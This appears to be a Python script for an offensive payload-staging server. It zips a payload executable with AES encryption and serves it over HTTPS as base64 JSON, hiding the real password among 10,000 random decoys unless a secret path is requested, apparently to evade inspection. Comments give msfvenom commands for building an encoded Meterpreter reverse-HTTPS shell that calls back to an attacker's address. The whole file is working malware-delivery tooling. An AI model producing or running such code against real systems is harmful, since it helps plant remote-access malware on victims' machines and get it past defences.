import random
import pyzipper
import http.server
import socketserver
import ssl
from base64 import b64encode
import os
import json
import argparse

# Change it
# ------------------ #
IP = ""
PORT = 443
PATH = '/super_secret_path'
REAL_PASSWORD_POSITION = 0
ZIP_PASSWORD = 'super_secret_password'
# ------------------ #

ZIP_FILENAME = 'archive.zip' # Only for server no need to change

# Payload examples
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.1 LPORT=5555 -f exe -a x64 -e x64/xor_dynamic -i 4 -o payload.exe
# msfvenom -p windows/x64/exec EXITFUNC=thread CMD=calc.exe -f exe -a x64 -o payload.exe

def create_zip_with_password(password: str, files_to_zip: list[str]) -> None:
    with pyzipper.AESZipFile(ZIP_FILENAME, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
        zipf.setpassword(password.encode())
        for file in files_to_zip:
            zipf.write(file, os.path.basename(file))

def https_server(keyfile: str, certfile: str, payload_name: str) -> None:
    password_charmap = "".join([chr(i) for i in range(33, 127)])
    file_charmap = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_."

    encoded_password = b64encode(ZIP_PASSWORD.encode()).decode()
    encoded_payload = b64encode(payload_name.encode()).decode()

    with open(ZIP_FILENAME, 'rb') as file:
        data = file.read()

    # Create a request handler
    class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            # Generate 10,000 Random Strings Encoded in Base64
            random_passwords = {}
            for i in range(0, 10000):
                random_string = ''.join(random.choices(password_charmap, k=len(ZIP_PASSWORD)))
                encoded_random_string = b64encode(random_string.encode()).decode()
                random_passwords[f"password_{i}"] = encoded_random_string
            
            if self.path == PATH:
                response = {
                    "name": encoded_payload,
                    "file": b64encode(data).decode()
                }
                
                random_passwords[f"password_{REAL_PASSWORD_POSITION}"] = encoded_password
            else:
                random_password = b64encode(''.join(random.choices(password_charmap, k=len(ZIP_PASSWORD))).encode()).decode()
                random_payload_file_name = ''.join(random.choices(file_charmap, k=len(payload_name)))
                response = {
                    "name": encoded_payload,
                    "file": b64encode(data).decode()
                }
            
            response.update(random_passwords)
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=certfile, keyfile=keyfile)

    with socketserver.TCPServer((IP, PORT), MyRequestHandler) as httpd:
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        print(f"\nServing on https://{IP if IP != '' else '0.0.0.0'}:{PORT}{PATH}")
        httpd.serve_forever()

def main():
    parser = argparse.ArgumentParser(description="Start an HTTPS server")
    parser.add_argument('--payload', required=True, help='Path to the payload file')
    parser.add_argument('--certfile', required=True, help='Path to the SSL certificate file')
    parser.add_argument('--keyfile', required=True, help='Path to the SSL key file')
    args = parser.parse_args()   

    create_zip_with_password(ZIP_PASSWORD, [args.payload])
    print(f"[+] Create zip arhive\n\tName: {ZIP_FILENAME}\n\tPassword: {ZIP_PASSWORD}")
    https_server(args.keyfile, args.certfile, os.path.basename(args.payload))

if __name__ == "__main__":
    main()